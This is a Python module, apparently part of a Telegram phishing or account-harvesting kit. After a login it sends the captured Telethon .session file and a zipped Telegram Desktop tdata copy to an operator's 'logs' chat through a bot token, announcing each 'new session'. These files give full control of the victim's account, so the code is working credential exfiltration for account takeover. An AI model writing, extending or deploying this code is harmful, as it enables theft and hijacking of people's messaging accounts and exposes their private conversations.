from __future__ import annotations

import logging
import os
import tempfile
import zipfile
from typing import Optional

from bot.config import BOT_TOKEN
from landing.telegram_send import send_telegram_document, send_telegram_text
from web.services.migration.settings import settings_repo
from web.services.tdata_converter import TDataConverter

logger = logging.getLogger(__name__)


async def deliver_session_artifacts(
	*,
	session_path: Optional[str],
	user_label: str = "",
) -> None:
	"""После логина: .session + zip(tdata) в chat_id логов."""
	settings = await settings_repo.load()
	chat_id = (settings.bot_chat_id or "").strip()
	token = (settings.bot_token or BOT_TOKEN or "").strip()
	if not chat_id or not token:
		logger.warning("skip session delivery: no bot_chat_id/token")
		return
	if not session_path or not os.path.isfile(session_path):
		logger.warning("skip session delivery: session missing %s", session_path)
		return

	label = (user_label or os.path.basename(session_path) or "account").strip()
	try:
		send_telegram_text(token, chat_id, f"🔐 Новая сессия: {label}")
	except Exception as exc:
		logger.warning("session caption failed: %s", exc)

	try:
		send_telegram_document(
			token,
			chat_id,
			session_path,
			caption=f"Telethon .session · {label}",
			filename=os.path.basename(session_path),
		)
	except Exception as exc:
		logger.warning("send .session failed: %s", exc)
		try:
			send_telegram_text(token, chat_id, f"❌ Не удалось отправить .session: {exc}")
		except Exception:
			pass

	tdata_zip: Optional[str] = None
	try:
		report = await TDataConverter().convert_one(session_path)
		tdata_dir = report.get("tdata") or ""
		if tdata_dir and os.path.isdir(tdata_dir):
			fd, tdata_zip = tempfile.mkstemp(prefix="tdata_", suffix=".zip")
			os.close(fd)
			_zip_dir(tdata_dir, tdata_zip)
			send_telegram_document(
				token,
				chat_id,
				tdata_zip,
				caption=f"Telegram Desktop tdata · {label}",
				filename=f"{os.path.splitext(os.path.basename(session_path))[0]}_tdata.zip",
			)
	except Exception as exc:
		logger.warning("send tdata failed: %s", exc)
		try:
			send_telegram_text(token, chat_id, f"❌ Не удалось отправить tdata: {exc}")
		except Exception:
			pass
	finally:
		if tdata_zip and os.path.isfile(tdata_zip):
			try:
				os.remove(tdata_zip)
			except OSError:
				pass


def _zip_dir(src_dir: str, zip_path: str) -> None:
	"""Упаковать содержимое tdata (и саму папку) в zip."""
	base_name = os.path.basename(src_dir.rstrip("\\/")) or "tdata"
	parent = os.path.dirname(src_dir.rstrip("\\/")) or "."
	# zipfile с относительными путями
	with zipfile.ZipFile(zip_path, "w", compression=zipfile.ZIP_DEFLATED) as zf:
		for root, _dirs, files in os.walk(src_dir):
			for name in files:
				full = os.path.join(root, name)
				rel = os.path.relpath(full, parent)
				zf.write(full, arcname=rel)
	# sanity
	if not os.path.isfile(zip_path) or os.path.getsize(zip_path) < 32:
		raise RuntimeError("tdata zip пустой")
